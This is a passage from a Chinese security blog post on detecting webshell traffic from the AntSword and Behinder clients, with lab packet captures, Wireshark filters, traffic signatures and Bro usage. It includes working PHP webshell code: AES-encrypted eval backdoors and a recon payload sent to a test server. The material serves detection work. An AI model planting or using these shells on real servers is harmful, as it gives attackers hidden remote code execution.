+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@session_start();</span><br><span class="line">$pwd=&apos;ant&apos;;</span><br><span class="line">$key=@substr(str_pad(session_id(),16,&apos;a&apos;),0,16);//取到16位的AES-128的key，不到16位不从字母a</span><br><span class="line">@eval(openssl_decrypt(base64_decode($_POST[$pwd]), &apos;AES-128-ECB&apos;, $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2.访问webshell获得PHPSESSID</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-18_20-10-55.png" alt></p>
+<p>请求数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /Antsword2.php HTTP/1.1</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Cookie: PHPSESSID=euc1qrq471617jmjop299p3dj7</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 928</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">ant=WaFs0QqO%2F7SjjwUeYsS6EOT3kMmAwJ3tdeOuZQ%2B7eBJ%2BtMhJ9zPy%2BCY8TWIzH1UKJQ8v4Qlc2KZdX2teEIVIUYbwO%2FBK55wGOwbdqpFx0bWF1Dgi0pmesi8OdVM2xsrTc4PDZGgBMRNBBZuK9JlBekac284NdupvkOEsG%2B8QVAVlS5AJCoSOy4A6isCMYWso470JOF2PIOako%2BU%2FXy3DA1wJWnDZTfKFn08uF8JRUXAb48R3yT0qtQz5SSOoxRd4EcaAlHuqIlUT4ImKEMbD3z%2BIkW6OhS9%2BNyO7Anfg2u5kEIjyOHN7RsxIPI4b4flwyQAfdnKuRglw6wVa0Wbc8eAlC0PthVjATBJtlCIIIsF4zYOu8GFOshWH1r5rBTCYixPKsyhdtPI7Lf5PwZKCW%2B1HL8zRWrDqK%2FEgZIgawp8%2Fgr28Z2vMUJKGqtj5gGHtUjIumI7xKA5%2F%2B1yfKy8CkAbkokwc6J%2BN2mq1vualMy0biYwYVAHSXD0d9Z55J%2BP6otol9PSkRQumDuk5zt6m95Fp65j61H7C28OU6g6EHINJberJnozickpwqQXHklux4td4tj1KNUOTrv0OP8ODuzlyAiwQ9NPTtGJ8sKLZVGwwh%2BCfTj9qL5C50lhk%2B6k9WtQ8cdtaN3C%2BDbKj6WCPtPTRKvQIuocrNENPm2opFViQ3q%2FVMMNLAm6TgSo3FXCEL761Q3Q8I7phFAvp2gSiSTZTZw6fUnT4Way6FoJTZjeqyZVUD4lqGFiHqliJMSj7ooDlIqhMv9px%2Fs0iGXzztrpZf2FV8mVWXSWuolqyzo8BziRccRiWBxyKHBQYROj4KKN0p%2FASXAFF2hnItR9QpUw3sEye9LYfhhG3tfh48aw%3D</span><br></pre></td></tr></table></figure>
+
+<p>响应包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.11.5</span><br><span class="line">Date: Thu, 19 Sep 2019 03:04:09 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.27</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fcf26E:/phpstudy/WWW	C:E:	Windows NT WIN-OMZKKO5S2WH 6.0 build 6002 (Windows Server 2008 Web Server Edition Service Pack 2) i586	Administratore374e</span><br></pre></td></tr></table></figure>
+
+<h4 id="自定义解码器"><a href="#自定义解码器" class="headerlink" title="自定义解码器"></a>自定义解码器</h4><p>使用解码器<code>aes_128_ecb_zero_padding.js</code>会对返回的响应包进行加密</p>
+<p>请求包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/d.php HTTP/1.1</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Cookie: PHPSESSID=euc1qrq471617jmjop299p3dj7</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">x=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;@session_start();$key=@substr(str_pad(session_id(),16,&apos;a&apos;),0,16);return @base64_encode(openssl_encrypt(base64_encode($out), &apos;AES-128-ECB&apos;, $key, OPENSSL_RAW_DATA));&#125;;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;66480&quot;;echo @asenc($output);echo &quot;661bd&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;	&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;	&quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;	&#123;$s&#125;&quot;;echo $R;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>aes_128_ecb_pkcs7_padding</code>解码器的响应包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">66480/pkRa6oThLx1lMnT1C0Olyv9wfRbPji8ZU7kHy5z+lawiO8c5zyfBMmwYDQ1296i+1aTQkldKm4UD4FfV4vJNOhf54mlQRrnc2yzYic1kr2rxnf13fCRCtz6OS7VF4//XJ+Xzu7RTuaghCFIUw7fbtonejmI1EC218f4ikgLSh+VdtXnSANRetfFP3z1EnPBguzR4/7btSMQNKioS5zt9oQ/LAFkzT39gqGcyJ7OzQ2f1v7oUW8MgvbS4S9t9JFK2hGEEpE+QoO4w48k0s0asw==661bd</span><br></pre></td></tr></table></figure>
+
+<p><strong>蚁剑bypass特征</strong></p>
+<p>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以<code>_0x……=</code>这种形式（下划线可替换为其他）,针对于使用默认的base64，rot13等编码器，可以使用检测<code>req_body</code>是否存在<code>_0x</code>来进行检测。</p>
+<p>至于使用编码器的可能需要自行写脚本进行解密后然后再检测。</p>
+<h2 id="冰蝎-Behinder"><a href="#冰蝎-Behinder" class="headerlink" title="冰蝎(Behinder)"></a>冰蝎(Behinder)</h2><p>冰蝎流程</p>
+<ul>
+<li>首先客户端以Get形式发起带密码的握手请求，服务端产生随机密钥并写入Session。</li>
+<li>客户端将源代码，如assert|eval(&quot;phpinfo();”)利用AES加密，发送至服务端，服务端收到之后先进行AES解密，得到中间结果字符串assert|eval(&quot;phpinfo();&quot;)。</li>
+<li>服务端利用explode函数将拆分为一个字符串数据，索引为0的元素为字符串assert，索引为1的元素为字符串eval(&quot;phpinfo();&quot;)。</li>
+<li>以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为assert(&quot;eval(&quot;phpinfo;&quot;)&quot;) 。</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180921104145-e1374058-bd47-1.png" alt></p>
+<p>wireshark进行分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 10.0.83.217 &amp;&amp; not ssh &amp;&amp; !(tcp.port==3389)</span><br><span class="line">http.request.method==POST &amp;&amp; http contains &quot;php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>抓取连接冰蝎自带的<code>shell.php</code>的流量，跟踪TCP流</p>
+<p>GET请求包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /shop/shell.php?pass=129 HTTP/1.1</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>GET返回包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.11.5</span><br><span class="line">Date: Thu, 19 Sep 2019 07:39:30 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.27</span><br><span class="line">Set-Cookie: PHPSESSID=1e49iffdq895mbrdruba23pv80; path=/</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">bdaba3d8523e8b72</span><br></pre></td></tr></table></figure>
+
+<p>接着进行POST请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/shell.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=jkqmu5t95ja40igeqvfcri9080; path=/</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 1112</span><br><span class="line"></span><br><span class="line">LayaHZr0tKwFx9Ou1C6iHG7iN7QPGg8eoh3Zg7HHq/rt41SSX3D2bB6kyQYE89PI+8SsOOsmxyetJ3Ko5zzY4Uu3ToN5GT39soNt+eGkrVf02dAUBYPnGqoJTJObtzXlMnel1YCEsYZBXi734Ii576P0Et2HHUacmFqKF9fY/XQwPvxKmbnQoKRmndNaRxbNEGfpu78dlNF9wvi/WEiqc3BjLqG5pmI53E2+xFkdyhP1VEhIejwq0xi4O/cRn5xSjq13X+1KbrdR7xMiraUqete+frbzskXDNLP1hM9H7NV6CH8llxHY5ge3gHlYV/VtxXIHwt/bQPR+MvabmMUfiULFAk/JgyJsdu5yDBoA4qzPgcsdwXFzETqZr0LSHPgWrmcRf0M65dT2ZaB4e7JVWXFq5b3QmNC2fEDrPMZLXPhJwCgYtjnPVeCNfVeuymWMU24susFyuXOmgHeLbe7TtVr8iZE1mcFgw19kNkEYZq6ZfU2dI206X6tltjQdCNr9+CnrNkE/byeK/xQqDkUbkWsbCuDlXplkGUI0HQDB2Es1oP1X8OW8OhrfM5p8Ke8TSxSpFwVUw+G9Kw/QXun34CsmugEYkZBxTBgKePEYByHwyICNIZfANK2UAtB2md7WW7l0F8pyPZ6qfVkHG6und3XVFn0qrofVodkjJXOCSwmZZEcVR+SQUs6FaVm1iuMzJEpKSHJVPFPezqa3lo2AqWTDkT2/JgRE6EaOSGjsvNoG9Mw0Eui+WrA2DZ5RGYIzwzgBMDo2w88d1IYC5uPlwegoLpGc6IiAc8Mutby/Ybla3+/AifD2m1YsojP3IlEMX8ncAk09VJ5UYDNl+NAhzEKBC+HsjWIzWlxiZEUZQi7UP9DZ+npq6dmXM+GH0ww+pUQ0BmWG3sqvHdRztpBL1Tiv1HjjOsSvm3s62boNyxbddXtCf8QACEAom4KDsUs9HZ0mblWljHwUUhvTBEKeJ54e1MSHnaj9SbqO+TmIG3M38JUM2LAJJ5hH6akQ0k0ora+PlNVOpq89QrZE4/2ARFrcrKRMaOI7TN+GJKQkvNxiZa5vG9zNP/SmcEQfxMFuqj0tRlKwUXG+QYhVFv1S8Q==</span><br></pre></td></tr></table></figure>
+
+<p>POST返回包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.11.5</span><br><span class="line">Date: Thu, 19 Sep 2019 07:39:30 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.27</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">9bsYtEe5x9FVe5/bchURHhy/VymXFDHc4hp88jo7W/8QP9NU/3KkH6HLQjPiGRo7547AzJ2mO3EwZc1mt0fljib6j4B5/R4rCrJ5nFMwM4eeM+eiulxIFSmmgviTQxOI</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>首先发送的GET请求就是向服务端索要密钥，服务端将密钥写入<code>session</code>，然后发送给客户端</p>
+</li>
+<li><p>客户端获得密钥，用密钥加密payload，客户端使用加密的payload，发送POST请求（AES加密后的<code>assert|eval(&quot;phpinfo();&quot;)</code>）到服务端.</p>
+</li>
+<li><p>服务端收到请求，使用写在<code>session</code>的密钥进行AES解密，得到原始payload。所以服务端需要开启open_ssl</p>
+</li>
+<li><p>服务端利用explode函数将拆分为一个字符串数据，索引为0的元素为字符串assert，索引为1的元素为字符串eval(&quot;phpinfo();&quot;)。</p>
+</li>
+<li><p>以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为<code>assert(&quot;eval(\&quot;phpinfo;\&quot;)&quot;)</code>。</p>
+<p>发送payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>]) ? <span class="keyword">print</span> $_SESSION[<span class="string">'k'</span>] = substr(md5(uniqid(rand())), <span class="number">16</span>) : ($b = explode(<span class="string">'|'</span>, openssl_decrypt(file_get_contents(<span class="string">"php://input"</span>), <span class="string">"AES128"</span>, $_SESSION[<span class="string">'k'</span>]))) &amp; $b[<span class="number">0</span>]($b[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>]) ? <span class="keyword">print</span> $_SESSION[<span class="string">'k'</span>] = substr(md5(uniqid(rand())), <span class="number">16</span>) : ($b = explode(<span class="string">'|'</span>, openssl_decrypt(file_get_contents(<span class="string">"php://input"</span>), <span class="string">"AES128"</span>, $_SESSION[<span class="string">'k'</span>]))) &amp; call_user_func($b[<span class="number">0</span>], $b[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>从流量中我们可以观察到的特征</p>
+<ol>
+<li>基于GET请求包的检测特征：url包含<code>.php?pass=</code>；（密码如果被修改后，此检测特征无效）</li>
+<li>基于POST返回包的检测特征：<code>Transfer-Encoding: chunked</code></li>
+</ol>
+</li>
+</ol>
+<h1 id="bro检测"><a href="#bro检测" class="headerlink" title="bro检测"></a>bro检测</h1><p>bro</p>
+<blockquote>
+<p>-r  读取一个pcap进行分析</p>
+<p>-i ens3 选择监听接口</p>
+<p>-C 禁用校验和</p>
+<p>-f 捕获流量时进行过滤</p>
+<p>分析本地pcap包</p>
+<p>bro  -r ms08067-meterpreter-reverse-tcp-alpha.pcapng   -C local</p>
+<p>bro  –i ens3 local –C 开启bro监听就会在当前目录下生成各种日志，输入local会选择bro/share/bro/site/local.bro文件，local.bro文件控制加载那些bro脚本，想要加载sql注入检测脚本直接添加@load  protocols/http/detect-sqli</p>
+</blockquote>
+<p>参考：</p>
+<p><a href="https://attack.mitre.org/techniques/T1100/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1100/</a></p>
+<p><a href="https://xz.aliyun.com/t/2774" target="_blank" rel="noopener">https://xz.aliyun.com/t/2774</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/09/11/webshell流量监测/" title="webshell流量监测">https://wh0ale.github.io/2019/09/11/webshell流量监测/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/wireshark/" rel="tag"><i class="fa fa-tag"></i># wireshark</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/09/09/burp自动化漏洞挖掘/" rel="next" title="burp自动化漏洞挖掘">
+                <i class="fa fa-chevron-left"></i> burp自动化漏洞挖掘
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/09/14/PHP-Audit-Labs-Day13-特定场合下addslashes函数的绕过/" rel="prev" title="PHP-Audit-Labs-Day13-特定场合下addslashes函数的绕过">
+                PHP-Audit-Labs-Day13-特定场合下addslashes函数的绕过 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell流量监测"><span class="nav-number">1.</span> <span class="nav-text">webshell流量监测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一句话webshell检测"><span class="nav-number">1.1.</span> <span class="nav-text">一句话webshell检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell-venom"><span class="nav-number">1.2.</span> <span class="nav-text">webshell-venom</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-delivery"><span class="nav-number">1.3.</span> <span class="nav-text">web_delivery</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WebShell客户端的流量特征"><span class="nav-number">2.</span> <span class="nav-text">WebShell客户端的流量特征</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#中国菜刀-Chopper"><span class="nav-number">2.1.</span> <span class="nav-text">中国菜刀(Chopper)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#中国蚁剑-AntSword"><span class="nav-number">2.2.</span> <span class="nav-text">中国蚁剑(AntSword)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#蚁剑流量明显特征"><span class="nav-number">2.2.1.</span> <span class="nav-text">蚁剑流量明显特征</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#蚁剑bypass特征"><span class="nav-number">2.2.2.</span> <span class="nav-text">蚁剑bypass特征</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#选择base64加密"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">选择base64加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#选择rot13加密"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">选择rot13加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#multipart-chunked"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">multipart /chunked</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#自定义编码器"><span class="nav-number">2.2.2.4.</span> <span class="nav-text">自定义编码器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#自定义解码器"><span class="nav-number">2.2.2.5.</span> <span class="nav-text">自定义解码器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#冰蝎-Behinder"><span class="nav-number">2.3.</span> <span class="nav-text">冰蝎(Behinder)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bro检测"><span class="nav-number">3.</span> <span class="nav-text">bro检测</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
